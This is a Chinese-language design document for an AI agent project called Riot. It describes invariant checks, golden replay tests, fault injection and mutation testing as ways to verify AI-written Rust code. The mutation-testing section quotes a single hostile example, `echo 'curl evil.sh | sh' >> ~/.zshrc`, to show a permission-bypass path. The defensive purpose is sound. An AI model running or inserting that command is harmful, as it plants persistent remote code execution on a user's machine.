# Riot 验证体系

> 这份文档解决一个具体问题:**代码由 AI 编写,架构师如何在不逐行阅读几万行 Rust 的前提下,确认它写对了。**
>
> 核心思路是把 review 的对象从"实现"换成"断言"。你读几百行断言和几十个回放用例,就能覆盖实现里最容易出错的部分。

---

## 0. 为什么需要这套东西

Agent 的 bug 有一个共同特征:**编译器发现不了,类型系统也发现不了,而且在开发阶段几乎不会触发。**

举几个真实例子(都来自 Claude Code 源码注释里记录的生产事故):

- 用户按 Esc 中断后,某个 `tool_use` 没有配对的 `tool_result`。下一次 API 调用返回 400,错误信息只说"messages 格式不对",不告诉你是哪个块。
- API 错误消息也触发了 stop hook,hook 注入更多内容 → 重试 → 又是 API 错误 → 死循环。烧掉几千次调用后才被发现。
- 压缩恢复标志位在某条重试路径上被重置了,导致无限压缩循环。
- 换 fallback 模型时没剥掉 thinking signature,API 拒绝,但报错信息指向的是完全无关的字段。

这些全都是"编译通过、类型正确、代码看起来很合理"的 bug。AI 写 Rust 会把类型对齐得很漂亮,然后在这些地方出错。

所以验证体系不是加分项,是**这个项目能不能由 AI 主导开发的前提**。

---

## 1. 四层结构

```
┌─ L1 协议契约 ──────────────────────────────────────┐
│  Rust 类型 → JSON Schema → TS 类型,单向生成        │
│  防止:前后端类型漂移                                │
├─ L2 不变量断言 ────────────────────────────────────┤
│  运行时检查消息序列、状态机、并发批次的合法性        │
│  防止:tool_result 配对缺失、状态机非法转移          │
├─ L3 黄金回放 ──────────────────────────────────────┤
│  录制会话 → mock 模型响应 → 断言事件序列逐条一致    │
│  防止:主循环行为回归                                │
├─ L4 故障注入 ──────────────────────────────────────┤
│  强制触发中断/限流/超时/溢出/降级,断言恢复行为      │
│  防止:异常路径写错(正常开发根本跑不到这些路径)     │
├─ L5 跨层端到端 ────────────────────────────────────┤
│  真实组件串起来跑,从原始字节到 AgentEvent          │
│  防止:两层各自都对,但接缝上的契约不匹配            │
└────────────────────────────────────────────────────┘
```

每层拦不同类型的错误,不能互相替代。

L5 是后加的,因为 L3 的替身太"干净"了。黄金回放用 `ScriptedProvider` 直接吐结构化的 `ProviderEvent`,跳过了 SSE 解析和解码——它证明的是"主循环的状态机对不对",证明不了"真实 provider 产出的东西主循环接不接得住"。

目前有两个 L5 套件,分别覆盖主循环的两个接缝:

**`riot-providers/tests/end_to_end.rs`** —— 模型侧:

```
原始字节 → SseParser → StreamDecoder → AnthropicProvider → run_agent → AgentEvent
```

分片故意切成 7 字节(质数,跟任何字段长度都不对齐),让每次运行都顺带压一遍解析器的边界处理。这一层立刻抓到了一个 L3 完全看不见的 bug,见 README 的 bug 表。

**`riot-tools/tests/with_agent_loop.rs`** —— 工具侧:

```
run_agent → Scheduler → partition → 并发执行 → 保序结果 → AgentEvent
```

它只盯一件事:**`tool_use` / `tool_result` 配对**。黄金回放用的 `ScriptedToolRunner` 按名字查表返回结果,不分批、不并发、不级联——而真实调度器有五条路径能让配对断掉(未注册、panic、级联、中断、取消)。每条都有对应用例。

---

## 2. L1:协议契约

### 2.1 单向生成

```
crates/riot-protocol/src/*.rs        (唯一真源)
        │  derive(JsonSchema)
        ├──→ schemas/*.json             (契约基准,提交进版本库)
        └──→ src/bridge/generated.ts    (前端类型,提交进版本库)
```

生成器:

```rust
// crates/riot-protocol/src/bin/gen_schema.rs
fn main() -> anyhow::Result<()> {
    let mut gen = SchemaGenerator::default();
    write_schema::<AgentEvent>(&mut gen, "schemas/agent_event.json")?;
    write_schema::<Message>(&mut gen, "schemas/message.json")?;
    write_schema::<RpcRequest>(&mut gen, "schemas/rpc_request.json")?;
    write_schema::<RpcResponse>(&mut gen, "schemas/rpc_response.json")?;
    emit_typescript("src/bridge/generated.ts")?;
    Ok(())
}
```

### 2.2 CI 检查

```bash
cargo run -p riot-protocol --bin gen_schema
git diff --exit-code schemas/ src/bridge/generated.ts
```

`[约束]` 这一步不通过就不能合并。手写 TS 类型是绝对禁止的——漂移不会有任何报错,只会在运行时表现为某个字段永远是 `undefined`,而这种 bug 可能几周后才被发现。

### 2.3 破坏性变更检测

`schemas/` 目录提交进版本库的另一个作用:**PR 的 diff 会直接显示协议变更**。

你 review 时只要看 `schemas/` 有没有变。变了就意味着前后端契约变了,值得多看一眼。没变的话,那个 PR 就不可能破坏前后端通信。

---

## 3. L2:不变量断言

### 3.1 设计原则

`[约束]` 不变量检查函数放在 `riot-core/src/invariants.rs`,由主循环在固定的检查点调用。

- debug build:违反 → `panic!`,立即暴露;
- release build:违反 → `tracing::error!` + 上报,但不中断用户会话。

```rust
macro_rules! invariant {
    ($cond:expr, $($arg:tt)*) => {
        if !$cond {
            let msg = format!($($arg)*);
            if cfg!(debug_assertions) {
                panic!("INVARIANT VIOLATED: {}", msg);
            } else {
                tracing::error!(invariant = %msg, "invariant violated");
                crate::telemetry::report_invariant_violation(&msg);
            }
        }
    };
}
```

### 3.2 必须实现的不变量

以下每一条都对应一个真实的、已知会发生的 bug。

#### INV-1:tool_use / tool_result 严格配对

```rust
pub fn check_tool_pairing(messages: &[Message]) {
    let uses: HashSet<&ToolUseId> = collect_tool_use_ids(messages);
    let results: HashSet<&ToolUseId> = collect_tool_result_ids(messages);

    invariant!(uses == results,
        "tool_use/tool_result mismatch: orphan_uses={:?}, orphan_results={:?}",
        uses.difference(&results).collect::<Vec<_>>(),
        results.difference(&uses).collect::<Vec<_>>());
}
```

**检查点**:每次调用 provider 之前。

**防的 bug**:中断后没补齐配对 → API 400。这是最高频的一类。

#### INV-2:消息序列合法

```rust
pub fn check_message_sequence(messages: &[Message]) {
    for w in messages.windows(2) {
        // tool_result 必须紧跟在包含对应 tool_use 的 assistant 消息之后
        // 不允许有 user 文本插在 tool_use 和 tool_result 之间
        invariant!(!(is_assistant_with_tool_use(&w[0]) && is_plain_user_text(&w[1])),
            "user text inserted between tool_use and tool_result");
    }
}
```

**检查点**:每次调用 provider 之前。

**防的 bug**:队列消息 drain 时机错误。用户在工具执行中途插话,消息被插到了 `tool_use` 和 `tool_result` 之间 → API 400。

#### INV-3:并发批次里没有写操作

```rust
pub fn check_batch_safety(batch: &[ToolUse], registry: &ToolRegistry) {
    if batch.len() <= 1 { return; }
    for tu in batch {
        let tool = registry.get(&tu.name).expect("tool must exist");
        invariant!(tool.is_concurrency_safe(&tu.input),
            "non-concurrency-safe tool `{}` in parallel batch of {}", tu.name, batch.len());
    }
}
```

**检查点**:每个并行批次开始执行前。

**防的 bug**:分批逻辑写错,导致两个 Edit 并行写同一个文件。

#### INV-4:Done 事件恰好一次,且是最后一个

```rust
pub struct StreamGuard { done_emitted: bool }

impl StreamGuard {
    pub fn observe(&mut self, ev: &AgentEvent) {
        invariant!(!self.done_emitted, "event emitted after Done: {:?}", ev);
        if matches!(ev, AgentEvent::Done { .. }) { self.done_emitted = true; }
    }
}
impl Drop for StreamGuard {
    fn drop(&mut self) {
        invariant!(self.done_emitted, "stream ended without emitting Done");
    }
}
```

**检查点**:包裹整个 `run_agent` 的输出流。

**防的 bug**:某条早退路径忘了 yield `Done` → UI 永远转圈。`Drop` 实现让这个检查在 panic 时也生效。

#### INV-5:恢复计数器单调

```rust
pub fn check_recovery_monotonic(prev: &AgentState, next: &AgentState) {
    // 同一个 turn 内,恢复计数只能增不能减
    if next.turn == prev.turn {
        invariant!(next.output_limit_recovery_count >= prev.output_limit_recovery_count,
            "recovery counter reset within same turn");
        invariant!(next.attempted_reactive_compact >= prev.attempted_reactive_compact,
            "reactive compact flag reset within same turn");
    }
}
```

**检查点**:每次 `state.advance()` 之后。

**防的 bug**:恢复标志位在某条重试路径上被意外重置 → 无限重试循环。

#### INV-6:API 错误路径不跑 stop hooks

```rust
pub fn check_hook_eligibility(last_message: &Message, about_to_run_hooks: bool) {
    invariant!(!(about_to_run_hooks && is_api_error_message(last_message)),
        "stop hooks about to run on an API error message — this causes infinite loops");
}
```

**检查点**:`run_turn_end_hooks` 入口。

**防的 bug**:error → hook 注入 → 重试 → error 的死循环。这个 bug 在 Claude Code 里烧掉过几千次 API 调用。

#### INV-7:控制面消息不进 API 请求

```rust
pub fn check_api_payload(messages: &[Message]) {
    invariant!(!messages.iter().any(|m| matches!(m, Message::System { .. })),
        "System message leaked into API request");
}
```

**检查点**:provider 序列化请求时。

#### INV-8:恰好一个 cache 断点

```rust
pub fn check_cache_breakpoints(req: &ModelRequest) {
    let n = count_message_cache_controls(req);
    invariant!(n <= 1, "found {} message-level cache_control markers, API allows at most 1", n);
}
```

**检查点**:provider 组装请求后。

#### INV-9:换模型后没有残留 thinking signature

```rust
pub fn check_thinking_signatures(messages: &[Message], model: &str) {
    for sig_model in collect_thinking_signature_models(messages) {
        invariant!(sig_model == model,
            "thinking signature from model `{}` sent to model `{}` — API will reject",
            sig_model, model);
    }
}
```

**检查点**:模型降级切换后,下一次请求前。

#### INV-10:路径围栏

```rust
pub fn check_path_in_fence(resolved: &Path, roots: &[PathBuf]) {
    invariant!(roots.iter().any(|r| resolved.starts_with(r)),
        "path {:?} escaped working directory fence {:?}", resolved, roots);
}
```

**检查点**:所有文件写操作实际执行前(权限检查之外的第二道防线)。

### 3.3 断言的 review 方式

你 review 时看两件事:

1. `invariants.rs` 里的检查函数是否都实现了,逻辑是否正确(这个文件应该在 300 行以内);
2. 主循环里的**检查点是否都调用了**。

第 2 点可以用一个测试保证:

```rust
#[test]
fn all_invariants_have_call_sites() {
    let src = include_str!("../src/loop.rs");
    for name in ALL_INVARIANT_FNS {
        assert!(src.contains(name), "invariant `{}` is never called", name);
    }
}
```

---

## 4. L3:黄金回放

### 4.1 原理

Agent 的行为 = 模型响应的函数。把模型响应固定下来,agent 的输出事件序列就应该是确定的。

```
crates/riot-core/tests/golden/<case>/
├── case.json           # 用户输入、模型、轮数上限、工具预设结果
├── responses/          # mock 的模型响应,按请求顺序编号
│   ├── 001.json
│   └── 002.json
└── expected.jsonl      # 期望的 AgentEvent 序列
```

响应存的是 `Vec<ProviderEvent>` 而不是原始 SSE。这是有意的:SSE 解析属于 provider 层,把它掺进来会让主循环的用例在"调整了一下 SSE 分块"时集体变红。等 provider 层落地后,它自己的解析用例用 `.sse`。

`case.json` 的字段:

| 字段 | 作用 |
|------|------|
| `description` | 这个用例在测什么。失败时它是第一条线索,必填 |
| `prompt` | 用户输入 |
| `max_turns` | 轮数上限,默认 8 |
| `tools` | 工具名 → 预设结果(`ok` / `failed` / `cancelled`) |
| `cancel_after_events` | 收到第 N 个事件后触发取消 |
| `compactor_fails_first` | 前 N 次压缩返回失败 |

### 4.2 确定性要求

`[约束]` 要让回放可靠,以下所有非确定性来源都必须可注入:

| 来源 | 抽象 | 测试实现 |
|------|------|---------|
| 时间 | `Clock` trait | `MockClock`,可手动快进 |
| 随机 ID | `IdGenerator` trait | 确定性序列 `msg_001`, `msg_002` |
| 文件系统 | `FileSystem` trait | 内存文件系统 |
| 子进程 | `ProcessRunner` trait | 预设命令 → 输出映射 |
| 模型 | `Provider` trait | 从 `responses/` 读 SSE |
| 并发调度 | `FuturesOrdered` | 见架构文档 §7.3 |

`[约束]` `riot-core` 里不允许直接调 `std::fs`、`std::process`、`SystemTime::now()`、`nanoid!()`。全部走注入的 trait。这条如果破了,回放测试会随机失败,然后所有人都会开始忽略它——那时整层防线就废了。

用一个 lint 强制:

```rust
// crates/riot-core/src/lib.rs
#![deny(clippy::disallowed_methods)]
```

```toml
# clippy.toml
disallowed-methods = [
  { path = "std::time::SystemTime::now", reason = "use Clock trait" },
  { path = "std::fs::read_to_string", reason = "use FileSystem trait" },
  { path = "tokio::time::sleep", reason = "use Clock trait" },
]
```

### 4.3 断言粒度

```rust
#[tokio::test]
async fn golden_replay() {
    for case in discover_cases("tests/golden") {
        let harness = Harness::from_case(&case);
        let actual: Vec<AgentEvent> = harness.run().collect().await;
        let expected = case.load_expected();

        assert_event_sequence_eq(&actual, &expected, &case.name);
    }
}
```

`[约束]` 比较时**忽略 Delta 事件**,只断言 `Message` / `Progress` / `Done` / `Compacted` / `PermissionRequest`。Delta 是渲染细节,断言它会让用例极其脆弱,改一点流式切分逻辑就全红。

`[约束]` 断言必须包含 `state.transition` 序列。这是区分"正常继续"和"因错误重试"的唯一手段:

```jsonl
{"type":"request_start","turn":0}
{"type":"message","role":"assistant","content":[{"type":"tool_use","name":"Read"}]}
{"type":"message","role":"user","content":[{"type":"tool_result","is_error":false}]}
{"_transition":"next_turn"}
{"type":"request_start","turn":1}
{"type":"message","role":"assistant","content":[{"type":"text"}]}
{"type":"done","reason":"completed"}
```

### 4.4 必须覆盖的场景

第一批用例,按优先级:

| 用例 | 覆盖 |
|------|------|
| `simple_text` | 无工具调用,一轮结束 |
| `single_tool` | 一个工具调用后结束 |
| `parallel_reads` | 三个 Read 并行,结果保序 |
| `mixed_batch` | read/read/edit/read 分批正确 |
| `tool_error` | 工具失败转成 `tool_result(is_error)`,模型重试 |
| `invalid_input` | schema 校验失败的错误措辞 |
| `edit_without_read` | 先读后写协议拒绝 |
| `permission_ask` | 权限请求往返 |
| `permission_deny` | 拒绝后模型换方案 |
| `interrupt_mid_tool` | 中断后 tool_result 配对补齐 |
| `queued_message` | 插话在工具结果后 drain |
| `multi_turn_10` | 十轮对话,状态累积正确 |

### 4.5 更新基准

改动主循环后,如果确认新行为是对的:

```bash
UPDATE_GOLDEN=1 cargo test -p riot-core --test golden
```

`[约束]` 这个命令**跑完之后仍然会失败**,这是故意的。如果它成功退出,人会顺手跳过审阅那一步——绿灯本身就是"没问题"的信号。让它红着,才会去看 `git diff`。

`[约束]` 更新后必须逐行审阅 diff 再提交。录下来的是**当前行为**,不是**正确行为**。当前行为要是错的,你把它录成基准,以后真正的修复反而会被这个测试挡住——那时这层防线就从资产变成了负债。

审阅时重点看三件事:

1. **变化的范围合不合理。**改压缩逻辑却让 `simple_text` 也变了,说明动到了不该动的地方。
2. **`after` 字段对不对。**它暴露的是恢复路径,`after=reactive_compact_retry` 出现在不该重试的地方就是 bug。
3. **有没有该出现却没出现的事件。**压缩成功必须有 `Compacted`;压缩失败**不能**有——那是谎报。

失败输出是逐行对齐的摘要,不是整个 JSON:

```text
用例 `context_overflow_retry` 的事件序列变了：
      0  request_start turn=0
  -   1  request_start turn=0 after=ReactiveCompactRetry
  +   1  compacted FullSummary
  +   2  request_start turn=0 after=ReactiveCompactRetry
```

摘要化是必要的。完整 JSON 一行三百字符,diff 里根本看不出哪里不一样,人会直接跳过审阅去跑 `UPDATE_GOLDEN`。

---

## 5. L4:故障注入

### 5.1 为什么单独一层

异常路径在正常开发中几乎跑不到。你可能开发几周都不会遇到一次 429,不会遇到上下文溢出,不会遇到模型降级。**这些路径的代码 AI 是照着描述写的,没有任何反馈证明它写对了。**

而它们恰恰是最容易写错的:恢复逻辑要处理半成品状态,要清理孤儿数据,要避免死循环。

### 5.2 注入点

```rust
pub struct FaultConfig {
    /// 第 N 次请求返回指定错误
    pub api_errors: HashMap<usize, ApiFault>,
    /// 第 N 次请求时触发取消
    pub cancel_at_request: Option<usize>,
    /// 指定工具执行时的行为
    pub tool_faults: HashMap<String, ToolFault>,
    /// 强制上下文 token 数(绕过真实计算,便于触发压缩)
    pub force_token_count: Option<u32>,
}

pub enum ApiFault {
    Status429 { retry_after: Option<u32> },
    Status529,
    ContextOverflow { used: u32, limit: u32 },
    MaxOutputTokens,
    StreamStall,          // 建连成功后不发数据,测 idle watchdog
    EmptyStream,          // message_start 后直接结束
    MalformedSse,
}

pub enum ToolFault {
    Panic,
    Hang,                 // 永不返回,测超时与取消
    HugeOutput(usize),
    SlowProgress { events: usize, interval_ms: u64 },
}
```

### 5.3 必须覆盖的故障用例

| 用例 | 注入 | 断言 |
|------|------|------|
| `retry_429` | 第 1、2 次 429,第 3 次成功 | 退避时长正确;用户看到重试提示;最终成功 |
| `respect_retry_after` | 429 带 `Retry-After: 5` | 等待 5s 而不是指数退避值 |
| `fallback_on_529` | 连续 3 次 529 | 切换到 fallback 模型;**thinking signature 被剥离**;孤儿 tool_use 补齐;发出 warning 事件 |
| `context_overflow_recover` | 第 2 次请求溢出 | 触发压缩后重试;错误**没有**泄漏给消费者(扣留机制) |
| `context_overflow_unrecoverable` | 压缩后仍溢出 | 这时才 surface 错误;`Done { Error }` |
| `compact_circuit_breaker` | 压缩连续失败 3 次 | 熔断,不再尝试;明确的错误消息 |
| `stream_stall` | 建连后不发数据 | idle watchdog 触发;降级到非流式;最终成功 |
| `tool_panic` | Bash 工具 panic | 转成 `tool_result(is_error)`;会话存活;其它工具不受影响 |
| `tool_hang_cancel` | 工具永不返回,3s 后取消 | 工具被取消;补齐 tool_result;`Done { Aborted }` |
| `interrupt_during_parallel` | 三个并行工具执行中取消 | 全部取消;三个 tool_result 都补齐 |
| `sibling_cascade` | 并行批中 Bash 失败 | 兄弟被取消;但 Read 失败时**不**级联 |
| `permission_timeout` | 权限请求无人应答 | 超时后 **deny**(不是 allow);会话继续 |
| `max_output_escalate` | 首次 `max_output_tokens` | 升到 64k 重试一次;再失败则注入续写消息 |
| `api_error_no_stop_hook` | 配了 stop hook + API 错误 | hook **没有**被执行(INV-6) |

`[约束]` `fallback_on_529` 和 `api_error_no_stop_hook` 这两个用例优先级最高。它们对应的是已知会造成严重后果的 bug(前者静默失败,后者烧钱)。

### 5.4 混沌测试

除了确定性用例,再加一个随机故障的长跑测试:

```rust
#[tokio::test]
#[ignore]  // 只在 CI 的 nightly job 跑
async fn chaos_soak() {
    for seed in 0..500 {
        let faults = FaultConfig::random(seed);
        let harness = Harness::with_faults(faults);
        let events: Vec<_> = harness.run_scripted_session().collect().await;

        // 不断言具体输出,只断言不变量
        assert!(matches!(events.last(), Some(AgentEvent::Done { .. })),
                "seed {} ended without Done", seed);
        assert_no_invariant_violations();
    }
}
```

这一层不检查"结果对不对",只检查"不管怎么failing,系统都能干净收场"。

实际落地的断言有三条:

1. 最后一个事件必须是 `Done`;
2. `Done` 只能有一个,且只能在最后(由 `StreamGuard` 保证);
3. 正常结束的会话里,事件流投影出的 transcript 不能有配对不上的 `tool_use`。

第 3 条要区分「正常结束」和「中断/错误终止」。被截断的响应会在事件流里留下半截 `tool_use`——它确实被 yield 过,UI 也确实渲染了。这不是 bug,主循环的扣留机制已经保证它不进 `state.messages`。只有会话**正常完成**却留下孤儿,才说明有问题。

每个 seed 单独 `tokio::spawn`,让一个 seed 的 panic 不中断整轮。一次跑完能看到全部失败的 seed,比修一个跑一次快得多。同时要临时静音 panic hook——500 个 seed 里哪怕只有几个失败,backtrace 也会把真正有用的 seed 列表冲掉。

**这一层的第一次运行就是有回报的。**500 个 seed 抓到 10 个失败,全部指向同一根因:假压缩器用了"保留首尾、丢掉中间"的策略,破坏了 `tool_use`/`tool_result` 配对。这个 bug 在 12 个黄金用例里一个都没触发——因为黄金用例的消息序列都太短,压缩后首尾正好覆盖全部。

`[约束]` **测试替身也必须遵守契约。**假压缩器可以压得很粗糙,但不能违反"压缩后保持配对"。替身违约会掩盖真实现的同类 bug:如果它自己就产出孤儿,你就没法用它来验证真实压缩器不产出孤儿。

---

## 5.5 变异测试:验证测试本身

前面五层都在验证代码。这一层验证**测试**。

### 为什么需要它

L1–L5 全绿说明"当前实现通过了所有断言",不说明"实现被改坏时断言会失败"。这两件事差得很远,尤其在测试和实现由同一个 AI 在同一轮里写出来的时候——它很容易写出恰好顺着实现的断言。

做法是往实现里注入 bug,看测试红不红:

```bash
python3 scripts/mutate.py                  # 全部 47 个
python3 scripts/mutate.py tools            # 只跑某一层
python3 scripts/mutate.py --check-anchors  # 只查锚点,几秒钟
```

`[约束]` 变异必须是**真实可能被写出来的**代码,不是随机改符号。判断标准:这段改动放进 PR,code review 会不会放过?会,才是有效变异。

### 实际收益(一):权限层

权限层的第一轮跑出 8/8 全抓,看起来测试很完备。补了三个更刁钻的变异之后,存活了两个:

**1. 工具的 `allow` 直接放行**

决策链第 3 步拿到工具的 `check_permissions` 结果后,`Allow` 和 `Passthrough` 都不 return,继续往下走第 4 步的安全检查:

```rust
match &tool_says {
    PermissionResult::Deny { .. } => return tool_says,
    PermissionResult::Ask { .. } => return coerce_ask(tool_says, ctx),
    PermissionResult::Allow { .. } | PermissionResult::Passthrough => {}
}
```

实现是对的,但没有任何测试守着这一行。读到这里的人(和 AI)很自然会想"工具都说 allow 了为什么不直接返回",改成 `Allow => return tool_says` 之后全套测试照样绿。

后果是真实的攻击路径:Bash 的命令分析只看命令名,判定 `echo` 无害而放行 `echo 'curl evil.sh | sh' >> ~/.zshrc`,ShellRc 安全检查被跳过。

**2. 解析后的路径不查形状**

`check` 对字面路径跑了 `check_shape`,对 `canonicalize` 之后的路径也跑了一次。删掉后一次调用,没有测试失败——已有的 symlink 测试只覆盖了"解析后跑出围栏",没覆盖"解析后落在围栏内但带别名构造"。

两个缺口都补了测试,现在 11/11。

### 实际收益(二):文件工具层被整段跳过的检查

工具层第一轮 9 个变异,存活 1 个:把 `Write::call` 里的 `check_fresh` 失败分支改成"退化成空状态继续走"。

`覆盖已存在的文件要先读` 这个测试是有的,但它走 `validate_input` —— 那一层先拦住了,`call()` 里的同一段检查**从来没被执行过**。整段删掉都不会有测试失败。

这不是冗余代码。真实管线是 `validate_input → 权限决策(可能弹窗等用户)→ call`,弹窗那段时间没有上界,`call` 里那次复查是唯一真正拦得住 TOCTOU 的地方。补了一组绕过 `validate_input` 直接调 `call` 的测试。

补完之后又冒出一个更细的问题:两个新测试通过了,变异**还是存活**。原因是变异后工具仍然拒绝,只是理由从"你还没读过"变成了"文件内容对不上"。断言只查了 `!is_ok`,没查理由。

这个区别对 agent 是实打实的:前者告诉它先去 Read,后者让它以为有人在并发改文件,于是重读、确认、再提交 —— 白跑一轮。断言收紧到具体措辞之后才抓住。

**教训**:断言"失败了"往往不够,要断言"以正确的理由失败"。喂给模型的错误消息是行为的一部分,不是文案。

### 存活不一定是缺口:等价变异

Bash 分析层加了 11 个变异之后,有一个存活了:把 `collect_commands` 改成只在 `program` / `list` / `pipeline` 下递归。

看起来是缺口,细查发现不是——当前白名单下,能通过 `scan_forbidden` 的树里 `command` 节点只可能挂在这三种节点底下,所以两种写法**行为完全一样**。这是等价变异,不是测试漏了。

但它仍然揭示了一件事:宽松遍历的正确性依赖于扫描阶段的完备性,这个耦合原本没写下来。两种写法的失效方向相反——扫描漏掉某个容器时,宽松遍历会多找到命令(多检查一遍,安全),严格遍历会直接漏掉(放行)。这条约束进了 `ast.rs` 的注释和 ARCHITECTURE.md。

`[约束]` 遇到存活变异,先判断是不是等价的,再决定补测试还是改变异。**不要为了让脚本变绿而写一个只能杀死这一个变异的测试**——那种测试没有独立价值,下次重构第一个被删的就是它。

### 关键在于会失败的那次

变异全被抓住时,这个脚本没有产出新信息。它的价值全在存活的那几个上——那是**测试覆盖的地图边界**,而且是你自己想不到的那部分边界。所以每次给权限层加逻辑,顺手加一个针对性变异,比再写三个测试有用。

顺带一提,锚点失效也是有用的信号。这轮改 `rules.rs` 引入 `MatchMode` 之后,两个变异的锚点对不上了,脚本把它们算作"存活"并报了出来——这正是想要的行为:实现变了而变异没跟上时,宁可误报也不能默默跳过。

`--check-anchors` 单独跑一遍锚点检查,几秒钟出结果,CI 里排在变异之前。这个顺序有讲究:锚点失效时脚本什么都没改却报"全部通过",那比红灯危险 —— 它给的是虚假的安全感。

### 变异脚本自己也会出事:活在仓库里的变异

`try/finally` 恢复源码挡不住 SIGKILL。一次被强杀的运行把「Unix 下不包进程组」留在了 `proc.rs` 里,而它:

- 编译通过;
- 绝大多数测试照样绿;
- 唯一的症状是 `cargo test --workspace` 从几秒变成六十多秒。

原因是后台进程继承了 stdout 管道,不杀掉它就永远等不到 EOF,于是每条带 `&` 的命令都卡满超时。这个变异在仓库里活了一整个开发回合,直到全量测试的耗时反常才暴露。

修复是**把原文落盘备份**(`.mutate-backup/`),脚本启动时检测并恢复:

```python
def stash(path, content):    # 改源码之前先落盘
def restore_stale():         # 启动时捡回上次没恢复的
```

`[约束]` 能扛住强杀的清理必须落盘,进程内的 `finally` 不算数。这条不只适用于变异脚本 —— 任何"改了全局状态然后要恢复"的工具都一样。

顺带一个观察:**测试套件的运行时长本身就是一个信号**。它变慢通常意味着某个地方在等一个不该等的东西,而那个"不该等"往往是真 bug。

---

## 6. 你的 review 清单

作为只负责架构的人,每个 PR 你只需要看这几样:

**必看**

1. `schemas/` 有没有变?变了说明协议改了。
2. `invariants.rs` 有没有被弱化?任何删除或注释掉断言的改动都要拦。
3. `tests/golden/*/expected.jsonl` 的 diff。这是行为变更的直接证据——如果一个 PR 声称"只是重构",但 expected 变了,说明它改了行为。
4. 新增的 `[约束]` 违反。架构文档里标 `[约束]` 的条目,实现里有没有绕过。

**抽查**

5. 新工具的 trait 实现:`is_concurrency_safe` 有没有正确声明?`max_result_size_chars` 合不合理?
6. 新的 `stream!` 块里有没有偷偷用 `?`。

**不用看**

- 具体算法实现
- 错误消息措辞(除了喂给模型的那些)
- UI 组件

### 6.1 一个实用技巧

让 AI 在每个 PR 里附一段"不变量影响说明":这次改动**可能**影响哪些不变量,为什么不会违反。

如果它说不清楚,那大概率是真的没想清楚。这比读代码快得多,也比问"你确定对吗"有效得多。

---

## 7. CI 流水线

两人小团队,日常 push 只拦干净机器上会漏的三类:协议生成物、内核 debug 测试、Windows 宿主。rustfmt、变异、release 复测、macOS host、混沌长跑放到 nightly / `workflow_dispatch`,避免改 UI 也被第二份清单卡住。

host 的 sidecar / 浏览器占位抽在 `.github/actions/prepare-host`,`host` 和 `chaos-host` 共用,不要在某个 job 里手写一份。

```yaml
# 每次 push / PR
contract:  pnpm gen && git diff --exit-code schemas/ src/bridge/generated.ts
test:      cargo clippy/test --workspace --exclude riot-host   # 含 golden / fault / e2e
host:      Windows 上 cargo test -p riot-host                  # 先 prepare-host

# nightly / 手动
extra:         cargo test --workspace --exclude riot-host --release
host (macOS):  与 Windows 同一套,只在 nightly 跑
mutation:      scripts/mutate.py
chaos:         cargo test -p riot-core --release chaos_soak
chaos-host:    cargo test -p riot-host --release -- --ignored
```

`[约束]` `cargo test --workspace` 必须在 debug 模式跑一遍,因为不变量断言只在 debug 下 panic。只跑 release 等于关掉了 L2 整层。

---

## 8. 这套体系的成本与收益

**成本**:大约占总代码量的 25–30%。L3 和 L4 的 harness 加起来可能 2000 行。

**收益**:

- 你的 review 对象从几万行 Rust 变成大约 300 行断言 + 几十个 jsonl 文件;
- AI 有了自动化反馈,能自己发现并修复大部分错误,不需要你介入;
- 重构安全。以后想把内核拆进程、换 provider、改压缩策略,黄金回放会告诉你有没有改坏。

`[约束]` **L2 和 L4 要在 M1 阶段就建好**,不能等"功能做完了再补测试"。原因很实际:如果先写功能后写测试,那些异常路径的代码会一直没有反馈,等你写测试时会发现它们从来就没对过,而那时改动成本已经高了。

L3 可以在 M1 后期开始,因为它需要主循环稳定下来才有意义。
